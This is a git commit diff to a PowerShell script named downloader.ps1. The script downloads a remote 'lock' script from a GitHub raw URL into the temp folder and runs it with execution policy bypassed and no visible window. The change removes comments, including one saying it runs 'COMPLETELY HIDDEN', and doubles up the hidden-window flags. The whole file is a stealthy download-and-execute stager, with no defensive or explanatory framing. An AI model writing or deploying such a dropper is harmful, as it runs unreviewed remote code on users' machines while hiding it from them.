ae261b35a5234ea022e5563b4057e86e72148ec5
Mubasher Chaudhary <follow.with.mubasher@gmail.com>
2026-08-24 04:25:02 -0700

    Modify script execution to run with no window
    Updated the script execution method to run without a window.

--- downloader.ps1
+++ downloader.ps1
@@ -1,9 +1,7 @@
-# Downloads and runs the lock script COMPLETELY HIDDEN
 $url = "https://raw.githubusercontent.com/CodewithMubasher/Scripts/main/script.ps1"
 $tempFile = Join-Path $env:TEMP "lock.ps1"
 
-# Download the script
 Invoke-WebRequest -Uri $url -OutFile $tempFile
 
-# Run it hidden and exit immediately
-Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$tempFile`""
+# Run the script with NO WINDOW
+Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$tempFile`"" -WindowStyle Hidden
